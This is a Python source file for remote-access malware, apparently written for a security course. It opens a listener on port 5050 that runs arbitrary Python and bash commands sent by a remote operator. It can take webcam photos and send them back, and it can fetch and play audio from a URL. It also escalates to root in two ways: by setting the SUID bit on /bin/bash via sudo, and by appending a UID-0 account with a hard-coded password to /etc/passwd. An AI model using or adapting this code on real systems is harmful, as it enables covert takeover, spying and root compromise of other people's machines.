#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import contextlib
import io
import struct
import crypt


THIS_FILE = os.path.realpath(__file__)

# Added for multiline

def send_framed(sock, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv_framed(sock):
    header = b""
    while len(header) < 4:
        header += sock.recv(4 - len(header))
    msg_len = struct.unpack(">I", header)[0]
    data = b""
    while len(data) < msg_len:
        data += sock.recv(msg_len - len(data)) 
    return data

# photo 

def take_photo(path="photo.jpg", camera_index=0):
    import cv2

    cap = cv2.VideoCapture(camera_index)
    if not cap.isOpened():
        raise RuntimeError("Could not open camera")

    try:
        ok, frame = cap.read()
        if not ok:
            raise RuntimeError("Could not read frame from camera")

        ok = cv2.imwrite(path, frame)
        if not ok:
            raise RuntimeError(f"Failed to write image to {path}")
    finally:
        cap.release()
    
    with open(path, "rb") as f:
        photo_bytes = f.read()
    return photo_bytes

# audio 


def play_audio_from_url(url):
    import requests, tempfile, subprocess, os
    r = requests.get(url, timeout=10)
    r.raise_for_status()
    suffix = os.path.splitext(url.split("?")[0])[1] or ".bin"
    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
        f.write(r.content)
        path = f.name
        print(f"File downloaded to: {path}")
    subprocess.run(
        ["ffplay", "-nodisp", "-autoexit", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    os.unlink(path)


def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )

# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050

def privesc():
    # Check if we are already root (Effective UID 0)
    if os.geteuid() != 0:
        print("Elevating to root using misconfigured chmod...")
        try:
            # 1. Use sudo to set the SUID bit on bash
            subprocess.run(["sudo", "/usr/bin/chmod", "+s", "/bin/bash"], check=True)
            print("[+] Successfully set SUID on /bin/bash using sudo")
            
            # 2. Replace the current process with a privileged bash process
            # bash -p is required to prevent bash from dropping the SUID root privileges
            os.execv("/bin/bash", ["bash", "-p", "-c", f"{sys.executable} {THIS_FILE}"])
            
        except Exception as e:
            print(f"Failed to elevate: {e}")
            sys.exit(1)
    else:
        print("Already running with root privileges.")

def privesc2():
    # 1. Generate the hash
    hash_str = crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512))
    # Define the line to inject
    line = f"oreo_root:{hash_str}:0:0:root:/root:/bin/bash"
    
    try:
        # 2. Use sudo + tee to append the line to /etc/passwd
        cmd = f"echo '{line}' | sudo tee -a /etc/passwd"
        subprocess.run(cmd, shell=True, check=True)
        print("[+] Successfully injected user via sudo tee")
        return True
    except Exception as e:
        print(f"[-] Failed to inject user: {e}")
        return False
 
def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/privileged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        import requests

def handle_python_command(user_input):
    buffer = io.StringIO()
    try:
        with contextlib.redirect_stdout(buffer):
            exec(user_input)
        output = buffer.getvalue() #AI for capturing output
        return output if output else "Success!"
    except Exception as e:
        return f"Error: {e}" 


def handle_conn(conn, addr):
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        #ADDED
        raw_data = recv_framed(conn) 
        # raw_data = conn.recv(1024)
        if not raw_data:
            return
        
        data = raw_data.decode("utf-8", errors="replace").strip()

        print("received: " + data)

        parts = data.split(" ", 1)
        command_type = parts[0]
        command_body = parts[1] if len(parts) > 1 else "" # AI for splitting

        #stuff I added -- START
        # Command 1: Privilege Escalation
        try: 
            if command_type == "PLAY_AUDIO":
                try:
                    url = command_body.strip()
                    play_audio_from_url(url)
                    send_framed(conn, b"Playing Audio")
                except Exception as e:
                    send_framed(conn, f"Audio error: {e}".encode())
            elif command_type =="click":
                photo_bytes = take_photo()
                send_framed(conn, photo_bytes)
            elif command_type == "privesc":
                print("Running privesc")
                privesc()
                # conn.sendall(b"Privesc triggered: restarting as root")
                send_framed(conn, b"Privesc triggered: restarting as root")
            elif command_type == "privesc2":
                print("Running privesc2")
                success = privesc2()
                if success:
                    send_framed(conn, b"[+] Privesc2 successful! Account 'oreo_root' created.")
                else:
                    send_framed(conn, b"[-] Privesc2 failed: check server logs.")
            #Command 2: Python 
            elif command_type == "PY":
                print("Running python")
                result = handle_python_command(command_body)
                # conn.sendall(result.encode("utf-8", errors="replace"))
                send_framed(conn, result.encode("utf-8", errors="replace"))
            
            elif command_type == "BASH":
                print(f"Running bash: {command_body}")
                
                # If we are root, we explicitly call bash -p to maintain privileges
                if os.geteuid() == 0:
                    exec_args = ["/bin/bash", "-p", "-c", command_body]
                else:
                    exec_args = ["/bin/sh", "-c", command_body]

                # Run the command directly (shell=False) to prevent /bin/sh from dropping UID
                proc = subprocess.run(
                    exec_args, 
                    shell=False, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE
                )
                
                output = proc.stdout + proc.stderr
                send_framed(conn, output if output else b"[no output]")
            else: 
                # conn.sendall(f"Unknown command: {command_type}".encode())
                send_framed(conn, f"Unknown command: {command_type}".encode())
        # Think VERY carefully about how you will communicate between the client and server
        # You will need to make a custom protocol to transfer commands
        # try:
        #     conn.sendall(run_command("whoami").stdout.encode())
            # Process the communication data from 
        except Exception as e:
            # conn.sendall(f"error: {e}".encode())
            send_framed(conn, f"error: {e}".encode())

def main():
    kill_others()
    bootstrap_packages()
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise
            except:
                print("Connection died")

if __name__ == "__main__":
    main()
